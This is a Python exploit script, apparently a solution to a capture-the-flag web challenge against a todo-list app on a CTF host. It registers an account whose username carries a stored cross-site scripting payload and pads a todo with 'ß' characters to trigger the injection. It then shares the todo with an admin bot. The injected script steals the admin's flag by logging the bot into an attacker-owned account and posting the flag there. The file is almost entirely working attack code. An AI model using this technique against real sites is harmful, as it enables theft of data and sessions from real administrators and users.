import requests
import re
import sys
import secrets
import string
import time

TARGET_URL = "http://bxs-archive-5ofxlghkdhni5wyanuupw.minori.node.bxs.team:81"

def main():
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = TARGET_URL

    print(f"[*] Target: {target_url}")

    receiver_username = "flag_recv_" + secrets.token_hex(4)
    receiver_password = "password"
    
    s_receiver = requests.Session()
    print(f"[*] Registering receiver account: {receiver_username}")
    s_receiver.post(f"{target_url}/register", data={
        "username": receiver_username,
        "password": receiver_password
    })

    js_payload = f"""
    <script>
    fetch('/edit/1', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
        body: 'title=pwned&content=' + 'ß'.repeat(100)
    }})
    .then(() => fetch('/view/1'))
    .then(r => r.text())
    .then(text => {{
        var m = text.match(/(CTF|flag){{.*?}}/);
        var flag = m ? m[0] : 'FLAG_NOT_FOUND';
        return fetch('/logout').then(() => flag);
    }})
    .then(flag => {{
        var formData = new URLSearchParams();
        formData.append('username', '{receiver_username}');
        formData.append('password', '{receiver_password}');
        
        return fetch('/login', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
            body: formData
        }}).then(() => flag);
    }})
    .then(flag => {{
        var formData = new URLSearchParams();
        formData.append('title', 'Flag Captured');
        formData.append('content', flag);
        return fetch('/create', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
            body: formData
        }});
    }});
    </script>
    """
    js_payload = re.sub(r'\s+', ' ', js_payload).strip()
    s_attacker = requests.Session()
    print("[*] Registering XSS carrier account...")
    res = s_attacker.post(f"{target_url}/register", data={
        "username": js_payload,
        "password": "password"
    })
    
    print("[*] Logging in as XSS carrier...")
    s_attacker.post(f"{target_url}/login", data={
        "username": js_payload,
        "password": "password"
    })
    
    print("[*] Creating trigger todo...")
    title = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))
    content_payload = "ß" * (len(js_payload) + 100)
    
    res = s_attacker.post(f"{target_url}/create", data={
        "title": title,
        "content": content_payload
    })
    
    match = re.search(rf'<a href="/view/(\d+)">{re.escape(title)}</a>', res.text)
    if not match:
        print("[-] Failed to find trigger todo ID.")
        sys.exit(1)
    
    todo_id = match.group(1)
    print(f"[+] Trigger Todo ID: {todo_id}")
    
    print("[*] Sharing with Admin to trigger XSS...")
    s_attacker.post(f"{target_url}/share/{todo_id}")
    
    print("[*] Waiting for bot to execute payload (10s)...")
    time.sleep(10)
    
    print(f"[*] Checking receiver account ({receiver_username}) for flag...")
    
    s_receiver.post(f"{target_url}/login", data={
        "username": receiver_username,
        "password": receiver_password
    })
    
    res = s_receiver.get(f"{target_url}/")
    
    match = re.search(r"(CTF|flag)\{.*?\}", res.text)
    if match:
        print(f"\n[SUCCESS] FLAG FOUND in Receiver Dashboard: {match.group(0)}\n")
        return

    print("[-] Flag not immediately visible. Checking specific todos...")
    todo_ids = re.findall(r'<a href="/view/(\d+)">', res.text)
    
    if not todo_ids:
        print("[-] No todos found in receiver account. XSS likely failed to switch accounts.")
    
    for tid in todo_ids:
        r = s_receiver.get(f"{target_url}/view/{tid}")
        match = re.search(r"(CTF|flag)\{.*?\}", r.text)
        if match:
            print(f"\n[SUCCESS] FLAG FOUND in Todo {tid}: {match.group(0)}\n")
            return
            
    print("[-] Flag not found. Exploit failed.")

if __name__ == "__main__":
    main()
